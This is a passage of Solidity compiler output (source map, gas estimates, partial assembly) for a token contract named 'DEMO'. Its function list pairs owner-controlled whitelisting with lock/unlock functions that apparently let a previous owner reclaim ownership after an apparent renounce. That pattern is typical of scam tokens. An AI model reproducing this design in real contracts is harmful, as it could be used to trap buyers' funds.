							"sourceMap": "2509:2723:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;670:83:2;;8:9:-1;5:2;;;30:1;27;20:12;5:2;670:83:2;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;670:83:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2536:148:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2536:148:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2536:148:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1559:91;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1559:91:1;;;:::i;:::-;;;;;;;;;;;;;;;;;;;2612:40:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2612:40:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2612:40:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;3155:256:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3155:256:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3155:256:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1522:83:2;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1522:83:2;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;3820:206:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3820:206:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3820:206:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;3075:132:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3075:132:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3075:132:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;3640:202;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3640:202:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3640:202:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;3850:265;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3850:265:0;;;:::i;:::-;;2567:38;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2567:38:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2567:38:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;311:29;;8:9:-1;5:2;;;30:1;27;20:12;5:2;311:29:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1713:110:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1713:110:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;1713:110:1;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;1446:140:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1446:140:0;;;:::i;:::-;;806:79;;8:9:-1;5:2;;;30:1;27;20:12;5:2;806:79:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;872:87:2;;8:9:-1;5:2;;;30:1;27;20:12;5:2;872:87:2;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;872:87:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2831:99:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2831:99:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2831:99:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;4529:216:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4529:216:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;4529:216:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2325:177:0;;;:::i;:::-;;4123:394;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2036:156:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2036:156:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2036:156:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;283:21:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;283:21:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2938:129;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2938:129:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2938:129:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;4990:239;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4990:239:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;2255:134:1;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2255:134:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;2255:134:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;4525:457:0;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4525:457:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;4525:457:0;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;1741:275;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1741:275:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;1741:275:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;2092:161;;8:9:-1;5:2;;;30:1;27;20:12;5:2;2092:161:0;;;:::i;:::-;;670:83:2;707:13;740:5;733:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;670:83;:::o;2536:148:1:-;2601:4;2618:36;2627:10;2639:7;2648:5;2618:8;:36::i;:::-;2672:4;2665:11;;2536:148;;;;:::o;1559:91::-;1603:7;1630:12;;1623:19;;1559:91;:::o;2612:40:0:-;;;;;;;;;;;;;;;;;:::o;3155:256:1:-;3244:4;3261:36;3271:6;3279:9;3290:6;3261:9;:36::i;:::-;3308:73;3317:6;3325:10;3337:43;3373:6;3337:11;:19;3349:6;3337:19;;;;;;;;;;;;;;;:31;3357:10;3337:31;;;;;;;;;;;;;;;;:35;;:43;;;;:::i;:::-;3308:8;:73::i;:::-;3399:4;3392:11;;3155:256;;;;;:::o;1522:83:2:-;1563:5;1588:9;;;;;;;;;;;1581:16;;1522:83;:::o;3820:206:1:-;3900:4;3917:79;3926:10;3938:7;3947:48;3984:10;3947:11;:23;3959:10;3947:23;;;;;;;;;;;;;;;:32;3971:7;3947:32;;;;;;;;;;;;;;;;:36;;:48;;;;:::i;:::-;3917:8;:79::i;:::-;4014:4;4007:11;;3820:206;;;;:::o;3075:132:0:-;3137:4;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3172:5;3154:9;:15;3164:4;3154:15;;;;;;;;;;;;;;;;:23;;;;;;;;;;;;;;;;;;3195:4;3188:11;;3075:132;;;:::o;3640:202::-;3696:12;3720:10;3696:35;;3747:3;:11;;;3759:6;3747:19;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3747:19:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;3747:19:0;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3747:19:0;;;;;;;;;;;;;;;;3742:93;;3804:3;:11;;;3816:6;3804:19;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;3804:19:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;3804:19:0;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;3804:19:0;;;;;;;;;;;;;;;;3783:6;:18;3790:10;3783:18;;;;;;;;;;;;;;;;:40;;;;;;;;;;;;;;;;;;3742:93;3640:202;;:::o;3850:265::-;3912:10;3899:23;;:9;:23;;;;3891:32;;;;;;3971:6;3961;3947:10;3942:16;;:25;:35;3934:44;;;;;;4015:4;3993:26;;:6;:18;4000:10;3993:18;;;;;;;;;;;;;;;;;;;;;;;;;:26;;;3989:119;;;4057:5;4036:6;:18;4043:10;4036:18;;;;;;;;;;;;;;;;:26;;;;;;;;;;;;;;;;;;4086:10;4077:6;;:19;;;;;;;;;;;;;;;;;;3989:119;3850:265::o;2567:38::-;;;;;;;;;;;;;;;;;;;;;;:::o;311:29::-;;;;;;;;;;;;;:::o;1713:110:1:-;1770:7;1797:9;:18;1807:7;1797:18;;;;;;;;;;;;;;;;1790:25;;1713:110;;;:::o;1446:140:0:-;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1545:1;1508:40;;1529:6;;;;;;;;;;;1508:40;;;;;;;;;;;;1576:1;1559:6;;:19;;;;;;;;;;;;;;;;;;1446:140::o;806:79::-;844:7;871:6;;;;;;;;;;;864:13;;806:79;:::o;872:87:2:-;911:13;944:7;937:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;872:87;:::o;2831:99:0:-;2883:4;2907:9;:15;2917:4;2907:15;;;;;;;;;;;;;;;;;;;;;;;;;2900:22;;2831:99;;;:::o;4529:216:1:-;4614:4;4631:84;4640:10;4652:7;4661:53;4698:15;4661:11;:23;4673:10;4661:23;;;;;;;;;;;;;;;:32;4685:7;4661:32;;;;;;;;;;;;;;;;:36;;:53;;;;:::i;:::-;4631:8;:84::i;:::-;4733:4;4726:11;;4529:216;;;;:::o;2325:177:0:-;2392:7;2379:9;:20;;2371:29;;;;;;2445:14;;;;;;;;;;;2416:44;;2437:6;;;;;;;;;;;2416:44;;;;;;;;;;;;2480:14;;;;;;;;;;;2471:6;;:23;;;;;;;;;;;;;;;;;;2325:177::o;4123:394::-;4162:12;4205:42;4195:52;;:6;;;;;;;;;;;:52;;;4187:61;;;;;;4280:10;4267:23;;:9;:23;;;;4259:32;;;;;;4331:1;4310:5;:17;4316:10;4310:17;;;;;;;;;;;;;;;;:22;4302:31;;;;;;4377:1;4352:9;:21;4362:10;4352:21;;;;;;;;;;;;;;;;:26;4344:35;;;;;;4411:5;4398:9;:18;4390:27;;;;;;4452:3;4428:9;:21;4438:10;4428:21;;;;;;;;;;;;;;;:27;;;;4486:1;4466:5;:17;4472:10;4466:17;;;;;;;;;;;;;;;:21;;;;4505:4;4498:11;;4123:394;:::o;2036:156:1:-;2105:4;2122:40;2132:10;2144:9;2155:6;2122:9;:40::i;:::-;2180:4;2173:11;;2036:156;;;;:::o;283:21:0:-;;;;;;;;;;;;;:::o;2938:129::-;2998:4;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3033:4;3015:9;:15;3025:4;3015:15;;;;;;;;;;;;;;;;:22;;;;;;;;;;;;;;;;;;3055:4;3048:11;;2938:129;;;:::o;4990:239::-;5034:4;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5080:3;5059:5;:17;5065:10;5059:17;;;;;;;;;;;;;;;;:24;;5051:33;;;;;;5115:1;5095:5;:17;5101:10;5095:17;;;;;;;;;;;;;;;:21;;;;5127:10;:19;;:42;5147:21;5127:42;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5127:42:0;5185:14;5194:4;5185:14;;;;;;;;;;;;;;;;;;;;;;5217:4;5210:11;;4990:239;:::o;2255:134:1:-;2327:7;2354:11;:18;2366:5;2354:18;;;;;;;;;;;;;;;:27;2373:7;2354:27;;;;;;;;;;;;;;;;2347:34;;2255:134;;;;:::o;4525:457:0:-;4572:12;4616:3;4605:7;:14;;4597:23;;;;;;4668:6;4658;4644:10;4639:16;;:25;:35;4631:44;;;;;;4714:1;4694:5;:17;4700:10;4694:17;;;;;;;;;;;;;;;;:21;4686:30;;;;;;4760:7;4735:9;:21;4745:10;4735:21;;;;;;;;;;;;;;;;:32;;4727:41;;;;;;4812:7;4787:21;:32;;4779:41;;;;;;4831:10;:15;;4851:7;4831:32;;;;;;;;;;;;;;;;;;;;;;;14:1:-1;21;16:31;;;;75:4;69:11;64:16;;144:4;140:9;133:4;115:16;111:27;107:43;104:1;100:51;94:4;87:65;169:16;166:1;159:27;225:16;222:1;215:4;212:1;208:12;193:49;7:242;;16:31;36:4;31:9;;7:242;;4831:32:0;;4874:45;4884:10;4904:4;4911:7;4874:9;:45::i;:::-;4951:1;4930:5;:17;4936:10;4930:17;;;;;;;;;;;;;;;;:22;;;;;;;;;;;4970:4;4963:11;;4525:457;;;:::o;1741:275::-;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1856:1;1836:22;;:8;:22;;;;1814:110;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1971:8;1942:38;;1963:6;;;;;;;;;;;1942:38;;;;;;;;;;;;2000:8;1991:6;;:17;;;;;;;;;;;;;;;;;;1741:275;:::o;2092:161::-;1028:10;1018:20;;:6;;;;;;;;;;;:20;;;1010:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2153:6;;;;;;;;;;;2136:14;;:23;;;;;;;;;;;;;;;;;;2187:1;2170:6;;:19;;;;;;;;;;;;;;;;;;2242:1;2205:40;;2226:6;;;;;;;;;;;2205:40;;;;;;;;;;;;2092:161::o;7070:335:1:-;7180:1;7163:19;;:5;:19;;;;7155:68;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7261:1;7242:21;;:7;:21;;;;7234:68;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7345:5;7315:11;:18;7327:5;7315:18;;;;;;;;;;;;;;;:27;7334:7;7315:27;;;;;;;;;;;;;;;:35;;;;7382:7;7366:31;;7375:5;7366:31;;;7391:5;7366:31;;;;;;;;;;;;;;;;;;7070:335;;;:::o;3215:417:0:-;3359:29;3381:6;3359:9;:17;3369:6;3359:17;;;;;;;;;;;;;;;;:21;;:29;;;;:::i;:::-;3339:9;:17;3349:6;3339:17;;;;;;;;;;;;;;;:49;;;;3422:32;3447:6;3422:9;:20;3432:9;3422:20;;;;;;;;;;;;;;;;:24;;:32;;;;:::i;:::-;3399:9;:20;3409:9;3399:20;;;;;;;;;;;;;;;:55;;;;3470:18;3478:9;3470:7;:18::i;:::-;3465:109;;3537:7;;3513:9;:20;3523:9;3513:20;;;;;;;;;;;;;;;;:31;;3505:57;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3465:109;3606:9;3589:35;;3598:6;3589:35;;;3617:6;3589:35;;;;;;;;;;;;;;;;;;3215:417;;;:::o;1315:184:4:-;1373:7;1406:1;1401;:6;;1393:49;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1453:9;1469:1;1465;:5;1453:17;;1490:1;1483:8;;;1315:184;;;;:::o;859:181::-;917:7;937:9;953:1;949;:5;937:17;;978:1;973;:6;;965:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1031:1;1024:8;;;859:181;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "2041600",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"Times(address)": "1215",
								"_owner()": "1098",
								"_previousOwner()": "1120",
								"allowance(address,address)": "1365",
								"approve(address,uint256)": "infinite",
								"balanceOf(address)": "1285",
								"buy()": "43249",
								"changeOwner()": "43089",
								"changestatus(address)": "infinite",
								"decimals()": "1151",
								"decreaseAllowance(address,uint256)": "infinite",
								"finish()": "infinite",
								"increaseAllowance(address,uint256)": "infinite",
								"isWhite(address)": "1334",
								"lock()": "46075",
								"name()": "infinite",
								"owner()": "1107",
								"renounceOwnership()": "24373",
								"sell(uint256)": "infinite",
								"setWhite(address)": "22212",
								"status(address)": "1251",
								"symbol()": "infinite",
								"totalSupply()": "1104",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite",
								"transferOwnership(address)": "infinite",
								"unlock()": "25132",
								"unsetWhite(address)": "22191"
							},
							"internal": {
								"_transfer(address,address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 2509,
									"end": 5232,
									"name": "MSTORE"
								},
								{
									"begin": 2727,
									"end": 2730,
									"name": "PUSH",
									"value": "64"
								},
								{
									"begin": 2709,
									"end": 2730,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 2709,
									"end": 2730,
									"name": "SSTORE"
								},
								{
									"begin": 2766,
									"end": 2823,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 2766,
									"end": 2823,
									"name": "POP"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MLOAD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP1"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "ADD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP1"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP2"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "ADD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "44454D4F00000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP2"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "POP"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MLOAD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP1"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "ADD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP1"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP2"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "ADD"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "PUSH",
									"value": "44454D4F00000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "DUP2"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "MSTORE"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "POP"
								},
								{
									"begin": 2817,
									"end": 2819,
									"name": "PUSH",
									"value": "12"
								},
								{
									"begin": 599,
									"end": 616,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 619,
									"end": 629,
									"name": "CALLER"
								},
								{
									"begin": 599,
									"end": 629,
									"name": "SWAP1"
								},
								{
									"begin": 599,
									"end": 629,
									"name": "POP"
								},
								{
									"begin": 649,
									"end": 658,
									"name": "DUP1"
								},
								{
									"begin": 640,
									"end": 646,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 640,
									"end": 646,
									"name": "DUP1"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "EXP"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "DUP2"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "SLOAD"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "DUP2"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "MUL"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "NOT"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "AND"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "SWAP1"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "DUP4"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "AND"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "MUL"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "OR"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "SWAP1"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "SSTORE"
								},
								{
									"begin": 640,
									"end": 658,
									"name": "POP"
								},
								{
									"begin": 707,
									"end": 716,
									"name": "DUP1"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "AND"
								},
								{
									"begin": 703,
									"end": 704,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "AND"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "PUSH",
									"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "MLOAD"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "MLOAD"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "DUP1"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "SWAP2"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "SUB"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "SWAP1"
								},
								{
									"begin": 674,
									"end": 717,
									"name": "LOG3"
								},
								{
									"begin": 565,
									"end": 725,
									"name": "POP"
								},
								{
									"begin": 530,
									"end": 534,
									"name": "DUP3"
								},
								{
									"begin": 522,
									"end": 527,
									"name": "PUSH",
									"value": "5"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP1"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "DUP1"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "MLOAD"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP1"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "ADD"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP1"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "PUSH [tag]",
									"value": "7"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP3"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP2"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "SWAP1"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "PUSH [tag]",
									"value": "8"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "JUMP",
									"value": "[in]"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "tag",
									"value": "7"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "JUMPDEST"
								},
								{
									"begin": 522,
									"end": 534,
									"name": "POP"
								},
								{
									"begin": 555,
									"end": 561,
									"name": "DUP2"
								},
								{
									"begin": 545,
									"end": 552,
									"name": "PUSH",
									"value": "6"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP1"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "DUP1"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "MLOAD"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP1"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "ADD"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP1"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "PUSH [tag]",
									"value": "9"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP3"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP2"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "SWAP1"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "PUSH [tag]",
									"value": "8"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "JUMP",
									"value": "[in]"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "tag",
									"value": "9"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "JUMPDEST"
								},
								{
									"begin": 545,
									"end": 561,
									"name": "POP"
								},
								{
									"begin": 584,
									"end": 592,
									"name": "DUP1"
								},
								{
									"begin": 572,
									"end": 581,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 572,
									"end": 581,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "EXP"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "DUP2"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "SLOAD"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "DUP2"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "PUSH",
									"value": "FF"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "MUL"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "NOT"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "AND"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "SWAP1"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "DUP4"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "PUSH",
									"value": "FF"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "AND"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "MUL"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "OR"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "SWAP1"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "SSTORE"
								},
								{
									"begin": 572,
									"end": 592,
									"name": "POP"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "POP"
								},
								{
									"begin": 433,
									"end": 600,
									"name": "POP"
								},
								{
									"begin": 433,
